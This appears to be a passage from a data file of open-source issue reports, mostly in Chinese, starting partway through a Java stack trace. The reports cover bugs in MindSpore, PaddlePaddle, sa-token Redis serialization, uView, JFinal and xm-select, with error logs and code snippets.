org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at net.mingsoft.basic.action.RoleAction$$EnhancerBySpringCGLIB$$6b3990f2.saveOrUpdateRole() at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:383) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:526) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:367) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:860) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1591) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.sql.SQLIntegrityConstraintViolationException: Cannot add or update a child row: a foreign key constraint fails (., CONSTRAINT FOREIGN KEY () REFERENCES () ON DELETE CASCADE ON UPDATE NO ACTION) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:117) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:953) at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:370) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3051) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3049) at com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.execute(PreparedStatementProxyImpl.java:167) at com.alibaba.druid.pool.DruidPooledPreparedStatement.execute(DruidPooledPreparedStatement.java:498) at sun.reflect.GeneratedMethodAccessor212.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:59) at com.sun.proxy.$Proxy201.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:46) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:50) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:63) at com.sun.proxy.$Proxy199.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:198) at org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:185) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 106 more   <code>: db-mcms-open role_model role_model_ibfk_2 rm_modelid model model_id db-mcms-open role_model role_model_ibfk_2 rm_modelid model model_id db-mcms-open role_model role_model_ibfk_2 rm_modelid model model_id db-mcms-open role_model role_model_ibfk_2 rm_modelid model model_id"
Paddle inference_demo中rnn1模型，python加载报维度错误,"标题：Paddle inference_demo中rnn1模型，python加载报维度错误 1）PaddlePaddle版本：1.4 2）CPU： 3）GPU：Nvidia p4, cuda8, cudnn7 4）系统环境：centos6.1, python3.5 复现信息： 报错如下 问题描述： 输入模型的数据确认是正确的，包括数据的 lod，shape信息（与/paddle/fluid/inference/tests/api/analyzer_rnn1_tester.cc的输入数据比对过）。 目前就是感到很困惑，输入数据正确，但并不能成功加载数据。   <code>: place = fluid.CPUPlace() exe = fluid.Executor(place) model_dir = ""/Paddle/build/third_party/inference_demo/rnn1/"" params_dirname = model_dir + ""model"" with fluid.scope_guard(fluid.core.Scope()): [program, feed, fetch] = fluid.io.load_inference_model( params_dirname, exe, model_filename='__model__', params_filename='__params__') prog_file = ""{}/__model__"".format(model_dir + ""model"") params_file = ""{}/__params__"".format(model_dir + ""model"") config = fluid.core.AnalysisConfig(prog_file, params_file) config.disable_gpu() program = fluid.compiler.CompiledProgram(program) program.with_inference_optimize(config) outputs = exe.run(program, feed=input_value)"
枚举序列化问题,"日志： Caused by: org.springframework.data.redis.serializer.SerializationException: Could not read JSON: Cannot deserialize instance of out of START_OBJECT token at [Source: (byte[])"" com.younuo.helper.client.bo.MchUserBO[""mchRole""]) at org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer.deserialize(GenericJackson2JsonRedisSerializer.java:152) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer.deserialize(GenericJackson2JsonRedisSerializer.java:130) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.core.AbstractOperations.deserializeValue(AbstractOperations.java:335) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.core.AbstractOperations$ValueDeserializingRedisCallback.doInRedis(AbstractOperations.java:61) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.core.RedisTemplate.execute(RedisTemplate.java:228) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.core.RedisTemplate.execute(RedisTemplate.java:188) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.core.AbstractOperations.execute(AbstractOperations.java:96) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at org.springframework.data.redis.core.DefaultValueOperations.get(DefaultValueOperations.java:53) ~[spring-data-redis-2.3.7.RELEASE.jar:2.3.7.RELEASE] at cn.dev33.satoken.dao.SaTokenDaoRedisJackson.getObject(SaTokenDaoRedisJackson.java:204) ~[sa-token-dao-redis-jackson-1.31.0.jar:na] at cn.dev33.satoken.dao.SaTokenDao.getSession(SaTokenDao.java:118) ~[sa-token-core-1.31.0.jar:na] 伪代码：   <code>: com.younuo.helper.client.enums.MchUserRoleEnum"
rate组件在微信小程序中滑动选择有问题,"问题描述： 滑动选择在真机和模拟器上会直接选择5颗星 单独点击没问题   <code>: 版本1.7.9 ""uview-ui"": ""^1.7.9"" 代码如下： &lt;u-cell-item hover-class=""none"" :arrow=""false"" title=""服务时效""&gt; &lt;u-rate size=""60"" v-model=""form.evaluateAging"" :count=""5""&gt;&lt;/u-rate&gt; &lt;/u-cell-item&gt;"
[CT][MS]numpy native interp fail in graph mode,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python interp.py TypeError: For 'Fill', the type of should be one of '['Number', 'bool']', but got 'None' with type 'NoneType'. [3. 3. 2.5 1.28 1. ]   <code>: import mindspore.numpy as np from mindspore.common import Tensor, dtype from mindspore.nn import Cell from mindspore import context context.set_context(mode=context.GRAPH_MODE) class Net(Cell): def construct(self, a, b, c): return np.interp(a, b, c) a = Tensor([0, 1, 1.5, 2.72, 3.14], dtype.float32) b = Tensor([1, 2, 3]) c = Tensor([3, 2, 1]) net = Net() out = net(a, b, c) print(out) value"
Problem about begin_pass and end_pass.,"I think and should be operators just like operators and . And then the BeginPass() should not use since we may connect to anything includes pserver. I think this functions should implement in operator and operator.   <code>: begin_pass end_pass SendBarrierOp FetchBarrierOp void GRPCClient::SendBeginPass() { for (auto&amp; it : channels_) { VLOG(3) &lt;&lt; ""send begin pass to: "" &lt;&lt; it.first; this-&gt;AsyncSendBeginPass(it.first); } this-&gt;Wait(); } void GRPCClient::SendEndPass() { for (auto&amp; it : channels_) { VLOG(3) &lt;&lt; ""send end pass to "" &lt;&lt; it.first; this-&gt;AsyncSendEndPass(it.first); } this-&gt;Wait(); } BeginPass EndPass"
[CT][MS][Function][heterogeneous] checkpoint not support add_prim_attr to cpu,": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device ascend : -- MindSpore version :ME+VM -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 7.3 pytest -s test_heterogeneous_execution.py::test_heterogeneous_execution_checkpoint_train_add_prim_attr_cpu | tee aa.log Precision comparison failed Precision comparison succed   <code>: class Conv2dReduceMean(nn.Cell): def __init__(self, in_channel, out_channel, kernel_size, stride_size, kernel_me, has_bias=False, bias=None): super().__init__() self.conv = nn.Conv2d(in_channel, out_channel, kernel_size, stride=stride_size, padding=0, has_bias=has_bias, weight_init=kernel_me, bias_init=bias) self.mean = P.ReduceMean(keep_dims=False) def construct(self, x): x = self.conv(x) x = self.mean(x, (2, 3)) return x class CheckpointPolicyFactory(MetaFactory): def __init__(self, epoch_size=1, batch_size=32, num_classes=12): super().__init__() self.epoch_size = epoch_size self.batch_size = batch_size self.num_classes = num_classes self.cur_dir = os.path.dirname(os.getcwd()) self.input_np1 = Tensor(np.random.randn(32, 3, 7, 7).astype(np.float32)) def image_data_proc(self): dataset = create_animal_no_random_dataset(epoch_size=self.epoch_size, batch_size=self.batch_size) self.num_classes = dataset.num_classes() return dataset def me_train_dataset(self, callbacks_func=None): dataset = self.image_data_proc() net = Conv2dReduceMean(in_channel=3, out_channel=12, kernel_size=1, stride_size=1, kernel_me=""ones"") loss = SoftmaxCrossEntropyWithLogits(is_grad=True, sparse=False) opt = Momentum(learning_rate=0.1, momentum=0.9, params=filter(lambda x: x.requires_grad, net.get_parameters())) model = Model(net, loss, opt) model.train(self.epoch_size, dataset, callbacks=callbacks_func) logger.info(""----finish model train-----"") infer = model.predict(self.input_np1) return infer.asnumpy() def me_train_dataset_add_prim_attr_to_cpu(self, callbacks_func=None): #context.set_context(mode=context.GRAPH_MODE, device_target=""CPU"") dataset = self.image_data_proc() net = Conv2dReduceMean(in_channel=3, out_channel=12, kernel_size=1, stride_size=1, kernel_me=""ones"") net.conv.conv2d.add_prim_attr(""primitive_target"", ""CPU"") loss = SoftmaxCrossEntropyWithLogits(is_grad=True, sparse=False) opt = Momentum(learning_rate=0.1, momentum=0.9, params=filter(lambda x: x.requires_grad, net.get_parameters())) model = Model(net, loss, opt) model.train(self.epoch_size, dataset, callbacks=callbacks_func) logger.info(""----finish model train-----"") infer = model.predict(self.input_np1) return infer.asnumpy() def test_heterogeneous_execution_checkpoint_train_add_prim_attr_cpu(): fact = CheckpointPolicyFactory(epoch_size=1, batch_size=10) config = CheckpointConfig(save_checkpoint_seconds=1, keep_checkpoint_per_n_minutes=2, save_checkpoint_steps=None, keep_checkpoint_max=None) ckpoint_cb = ModelCheckpoint(prefix=""CKPT_OTime_ST"", directory=fact.cur_dir, config=config) sleep_cb = SleepCallback(1) out_device = fact.me_train_dataset(callbacks_func=[sleep_cb, ckpoint_cb]) out_heter = fact.me_train_dataset_add_prim_attr_to_cpu(callbacks_func=[sleep_cb, ckpoint_cb]) allclose_nparray(out_device, out_heter, 1e-3, 1e-3)"
LambdaQueryWrapper 增强,"当前使用版本 3.4.1 新功能 是否可以添加这样一组方法，例： 这样可以简化一部分判断条件，另外不满足条件时也不会执行 value 里的方法减少开销。   <code>: wrapper.eq(condition, column, () -&gt; 表达式);"
[ST][MS/AKG][NET][facerecognition][GPU] TVMError makes train fail ,"训练失败 OK_commit_id:42306df 失败commit_id:998a38b / 硬件环境: /device GPU/ : -- MindSpore version :master commit_id:998a38b5 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_facerecognition_beta_gpu_check_loss_8p_0004.py get code from models sh run_distribute_train_gpu.sh 训练成功 走给张任伟   <code>: Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_akg/akg/ms/message.py"", line 164, in _compilewithjson_to_module composite.build(kernel_info, attrs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_akg/akg/composite/build_module.py"", line 562, in build return _build_to_module(desc_s, desc_d, attrs, poly) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_akg/akg/composite/build_module.py"", line 407, in _build_to_module return func(process, poly, segment_tree, segment_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_akg/akg/tvm/_ffi/_ctypes/function.py"", line 207, in __call__ raise get_last_ffi_error() tvm._ffi.base.TVMError: Traceback (most recent call last): [bt] (8) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::GpuDmaAnalysis::RemoveInjectiveTensorFromMemFlows(isl::schedule)+0x13f) [0x7f927bb25b9f] [bt] (7) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::GpuDmaAnalysis::GetTiledNode(isl::schedule, isl::schedule_node)+0x2cf) [0x7f927bb2215f] [bt] (6) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::GenerateTiling(isl::schedule const&amp;, akg::ir::poly::ScopInfo&amp;, air::Stmt)+0x130) [0x7f927bcc8830] [bt] (5) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::TilingAnalyzer::Prepare()+0x75e) [0x7f927bcda26e] [bt] (4) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::SpaceAnalyzer::AnalyzeSpecialAxes()+0x3c4) [0x7f927bcc2024] [bt] (3) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::SpaceAnalyzer::IdentifyInsnType()+0x868) [0x7f927bcc1be8] [bt] (2) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::SpaceAnalyzer::MarkGemmAxes(akg::ir::poly::AnalysisResult::ProvideEntry const&amp;)+0x722) [0x7f927bcbac82] [bt] (1) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ir::poly::ExtractLoopIndicesFromMatrices(std::vector&lt;std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt;, std::allocator&lt;std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt;)+0x191c) [0x7f927bd3f75c] [bt] (0) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libakg.so(dmlc::LogMessageFatal::~LogMessageFatal()+0x5c) [0x7f927b43c4ac] File ""/home/jenkins/agent-working-dir/workspace/Compile_GPU_X86_CentOS_Cuda11/mindspore/akg/src/poly/tiling/tiling_utils.cc"", line 196 TVMError: Check failed: gemm_b.size() &lt;= FormatB.size() (3 vs. 2) : multiprocessing.pool.RemoteTraceback: """""" Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 121, in worker result = (True, func(*args, **kwds)) File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 47, in starmapstar return list(itertools.starmap(args[0], args[1])) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/akg_compiler/akg_process.py"", line 40, in _compile_akg_task_default raise ValueError(""Compile error, args: {}! build attrs: {}"".format(json_str, attrs))"
ext包内的handler类FakeStaticHandler的处理问题,"源码： 中间执行这句话验证请求地址里有没有 如果请求地址是： 这样的地址完全没问题，可以处理掉后面的 但是如果地址是： 这样的地址，断点进去看到target的值是这个地址也是合法的，本不应该过滤后缀直接进入到controller中，但因为上面还有一层处理的逻辑，导致直接报错了 不知道当初开发这个handler的时候是出于什么初衷还要过滤一下？   <code>: public void handle(String target, HttpServletRequest request, HttpServletResponse response, boolean[] isHandled) { if(""/"".equals(target)) { this.nextHandler.handle(target, request, response, isHandled); } else if(target.indexOf(46) == -1) { HandlerKit.renderError404(request, response, isHandled); } else { int index = target.lastIndexOf(this.viewPostfix); if(index != -1) { target = target.substring(0, index); } this.nextHandler.handle(target, request, response, isHandled); } } } else if(target.indexOf(46) == -1) { . http://www.xxx.com/user/abc.html .html http://www.xxx.com/user/abc /user/abc . ."
下拉树，异步加载默认展开层级expandedKeys不生效,"下拉树，异步加载数据后，设置的展开层级expandedKeys不生效 $.get('{% url ""pc_personnel-get_xm_department"" %}', {type: 'school_id',key:school_id}, function (res) { if (res.code == 0) { console.log(res.data); demo2.update({ data: res.data, tree: {expandedKeys: true}, }) } }, 'json');   <code>: var demo2 = xmSelect.render({ el: '#department', name:'department_id', autoRow: true, filterable: true, tree: { //是否显示树状结构 show: true, //是否展示三角图标 showFolderIcon: true, //是否显示虚线 showLine: false, //间距 indent: 20, //默认展开节点的数组, 为 true 时, 展开所有节点 expandedKeys: [], //是否严格遵守父子模式 strict: true, //是否开启极简模式 simple: false, }, toolbar: { show: true, list: ['ALL', 'REVERSE', 'CLEAR'] }, data: [ ] });"
redis用户session中时间LocalDateTime字段序列化问题,"使用版本: 1.28.0 使用redis缓存用户信息 1.27.0.升级前 ： LocalDateTime字段配置的序列化格式为""yyyy-MM-dd HH:mm:ss""，可以正常使用。 升级1.28.0后：localDateTime类型的字段无法反序列化，清空redis缓存后,用户信息重新缓存，发现LocalDateTime类型的字段序列化的格式为""2021-11-15T12:09:20""，不是配置中的""yyyy-MM-dd HH:mm:ss""。 将版本退回到1.27.0问题就没有了。 在1.28.0中redis可以对LocalDateTime类型的字段可以缓存配置的时间格式。   <code>: org.springframework.data.redis.serializer.SerializationException: Could not read JSON: Cannot deserialize value of type `java.time.LocalDateTime` from String ""2021-11-15 15:44:48"": Failed to deserialize java.time.LocalDateTime: (java.time.format.DateTimeParseException) Text '2021-11-15 15:44:48' could not be parsed at index 10 at [Source: (byte[])""{""@class"":""cn.dev33.satoken.session.SaSession"",""id"":""token:login:session:Pd001"",""createTime"":1636963185898,""dataMap"":{""@class"":""java.util.concurrent.ConcurrentHashMap"",""user"":{""@class"":""com.gosuncn.sz.ccsp2.dao.bjyw.entity.BjUser"",""id"":4,""account"":""Pd001"",""xm"":""超级管理员"",""xbdm"":""1"",""csrq"":null,""kadm"":""001"",""bmdm"":""001010"",""password"":""123456"",""zwdm"":null,""qybz"":""1"",""qxlx"":""1"",""createUser"":null,""createTime"":""2021-11-15 15:44:48"",""updateUser"":null,""updateTime"":null,""deptId"":44030001001,""kamc""[truncated 7902 bytes]; line: 1, column: 417] (through reference chain: cn.dev33.satoken.session.SaSession[""dataMap""]-&gt;java.util.concurrent.ConcurrentHashMap[""user""]-&gt;com.gosuncn.sz.ccsp2.dao.bjyw.entity.BjUser[""createTime""]); nested exception is com.fasterxml.jackson.databind.exc.InvalidFormatException: Cannot deserialize value of type `java.time.LocalDateTime` from String ""2021-11-15 15:44:48"": Failed to deserialize java.time.LocalDateTime: (java.time.format.DateTimeParseException) Text '2021-11-15 15:44:48' could not be parsed at index 10 at [Source: (byte[])""{""@class"":""cn.dev33.satoken.session.SaSession"",""id"":""token:login:session:Pd001"",""createTime"":1636963185898,""dataMap"":{""@class"":""java.util.concurrent.ConcurrentHashMap"",""user"":{""@class"":""com.gosuncn.sz.ccsp2.dao.bjyw.entity.BjUser"",""id"":4,""account"":""Pd001"",""xm"":""超级管理员"",""xbdm"":""1"",""csrq"":null,""kadm"":""001"",""bmdm"":""001010"",""password"":""123456"",""zwdm"":null,""qybz"":""1"",""qxlx"":""1"",""createUser"":null,""createTime"":""2021-11-15 15:44:48"",""updateUser"":null,""updateTime"":null,""deptId"":44030001001,""kamc""[truncated 7902 bytes]; line: 1, column: 417] (through reference chain: cn.dev33.satoken.session.SaSession[""dataMap""]-&gt;java.util.concurrent.ConcurrentHashMap[""user""]-&gt;com.gosuncn.sz.ccsp2.dao.bjyw.entity.BjUser[""createTime""]) at org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer.deserialize(GenericJackson2JsonRedisSerializer.java:152) at org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer.deserialize(GenericJackson2JsonRedisSerializer.java:130)"
callback函数中存在Python多线程错误,"GPU环境下训练过程中，callback回调函数遇到Python多线程错误: Fatal Python error: ceval: tatate mix-up. / 硬件环境: GPU : -- MindSpore version :MindSpore-1.6.1-GPU -- Python version : Python 3.7.5 -- OS platform and distribution: Linux Ubuntu 18.04 (/): /mode graph 手动实现的VGG UNet:train.py 在每一个step中打印loss以及通过验证集上的loss保存模型 在随机steps时（有时50，有时300很随机）会出现Python多线程报错 已排除GeneratorDataset类中的python_multiprocessing参数问题 能正常执行完每一个epoch 所使用callback 示例：   <code>: class SaveCallBack(Callback): def __init__(self, eval_model, val_dataset, net_name: str = ""MuggleNet""): super(SaveCallBack, self).__init__() self.net_name = net_name self.dev_loss = np.inf self.model = eval_model self.val_dataset = val_dataset self.train_loss_list = [] self.dev_loss_list = [] self.dice_list = [] def step_end(self, run_context): cb_params = run_context.original_args() res = self.model.eval(self.val_dataset, dataset_sink_mode=False) self.dev_loss_list.append(res['loss']) self.dice_list.append(res['dice']) cur_step_in_epoch = (cb_params.cur_step_num - 1) % cb_params.batch_num + 1 train_loss = cb_params.net_outputs if isinstance(train_loss, (tuple, list)): if isinstance(train_loss[0], ms.Tensor) and isinstance(train_loss[0].asnumpy(), np.ndarray): train_loss = train_loss[0] if isinstance(train_loss, ms.Tensor) and isinstance(train_loss.asnumpy(), np.ndarray): train_loss = float(np.mean(train_loss.asnumpy())) self.train_loss_list.append(train_loss) print(f""step {cur_step_in_epoch}, loss: {train_loss}"") if res['loss'] &lt; self.dev_loss: self.dev_loss = res['loss'] file_name = self.net_name + "".ckpt"" ms.save_checkpoint(save_obj=cb_params.train_network, ckpt_file_name=os.path.join('trained_model', file_name)) print(""Save the minimum loss checkpoint,the loss on validation set is"", self.dev_loss) def plot_loss(self): plt.figure() x = range(len(self.dev_loss_list)) dev_loss = self.dev_loss_list train_loss = self.train_loss_list plt.plot(x, dev_loss, label='validation set') plt.plot(x, train_loss, label='training set') plt.legend() plt.title(f""The {self.net_name}'s loss of training set and validation set"") plt.xlabel('steps') plt.ylabel('Loss value') plt.show() def write_loss(self): train_path = os.path.join('train_info', self.net_name + 'loss.npy') dev_path = os.path.join('train_info', self.net_name + 'loss.npy') np.save(train_path, np.array(self.train_loss_list)) np.save(dev_path, np.array(self.dev_loss_list))"
Add inference example and unit-test (for inference framework) for word2vec chapter,TODO: The commit history is messed up. I have commented some unit-test code in the file   <code>: .py
[CT][MS][OP]Usability of error information of CheckTensorTypeValid method.,: ascend cpu /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : test_hsvtorgb.py::test_hsvtorgb_input_none pytest -s -v test_hsvtorgb.py::test_hsvtorgb_input_none 报错信息正确 报错信息中有The primitive[HSVToRGB]后缺少's   <code>: def test_hsvtorgb_input_none(): input_x = None net = HSVToRGB() fact = AnyNetFactory(net=net) # with pytest.raises(TypeError): &gt; fact(input_x) E TypeError: mindspore/core/utils/check_convert_utils.cc:523 CheckTensorTypeValid] The Primitive[HSVToRGB] input argument[x] must be a Tensor but got kMetaTypeNone. E The function call stack (See file '/home/zhangting/1011code/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details): E # 0 In file /home/zhangting/1011code/MindSporeTest/share/ops/primitive/hsvtorgb_ops.py(17) E return self.hsv_to_rgb(input_x)
